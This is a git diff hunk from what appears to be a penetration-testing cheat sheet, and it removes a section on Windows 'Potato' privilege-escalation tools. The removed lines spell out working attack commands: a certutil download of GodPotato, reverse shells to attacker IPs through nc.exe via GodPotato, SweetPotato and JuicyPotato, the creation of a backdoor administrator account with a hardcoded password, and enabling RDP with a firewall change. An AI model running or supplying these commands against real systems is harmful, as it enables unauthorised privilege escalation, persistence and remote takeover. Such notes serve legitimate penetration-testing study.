@@ -762,56 +762,8 @@ git diff <commit hash>
 
 
 
-### Potatoes
 
 
-
-**GodPotato**
-
-```jsx
-certutil -urlcache -split -f http://192.168.45.247/GodPotato/GodPotato-NET4.exe
-.\GodPotato-NET4.exe -cmd "cmd /c whoami"
-.\GodPotato-NET4.exe -cmd "cmd /c C:/Windows/Temp/shell.exe"
-
-.\GodPotato-NET4.exe -cmd "nc64.exe -t -e C:\Windows\System32\cmd.exe 192.168.45.247 443"
-net user /add [username] [password]
-net localgroup administrators [username] /add
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
-```
-
-```jsx
-net user /add kali SuperPass123!
-net localgroup administrators kali /add
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
-netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
-```
-
-[https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
-
-**SweetPotato**
-
-Download: https://github.com/carr0t2/SweetPotato/releases/tag/v1.0.0
-
-```jsx
-.\SweetPotato.exe -e EfsRpc -p c:\Users\Public\nc.exe -a "10.10.10.10 1234 -e cmd"
-```
-
-[https://github.com/CCob/SweetPotato](https://github.com/CCob/SweetPotato)
-
-**JuicyPotato (x86)**
-
-Download: https://github.com/ivanitlearning/Juicy-Potato-x86/releases
-
-Get CLSID: [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)
-
-```jsx
-Juicy.Potato.x86.exe -c {CLSID} -t * -l 443 -p "C:\Temp\nc.exe" -a "192.168.45.194 443 -e cmd" 
-```
-
-[juicy-potato/CLSID at master · ohpe/juicy-potato](https://github.com/ohpe/juicy-potato/tree/master/CLSID)
-
-Video: [https://www.youtube.com/watch?v=k9p6wZO7RyY](https://www.youtube.com/watch?v=k9p6wZO7RyY)
 
 # Active Directory
 
